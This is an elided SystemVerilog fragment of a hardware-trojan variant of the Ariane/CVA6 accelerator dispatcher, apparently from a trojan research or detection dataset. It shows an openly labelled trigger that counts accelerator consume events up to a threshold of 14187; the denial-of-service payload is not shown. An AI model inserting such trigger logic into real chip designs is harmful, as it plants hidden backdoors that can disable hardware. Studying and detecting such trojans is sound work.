...
module acc_dispatcher_trojan_DoS
  import ariane_pkg::*;
  import riscv::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=14187)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14187;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (acc_cons_en_i) trojan_counter <= trojan_counter + 1;
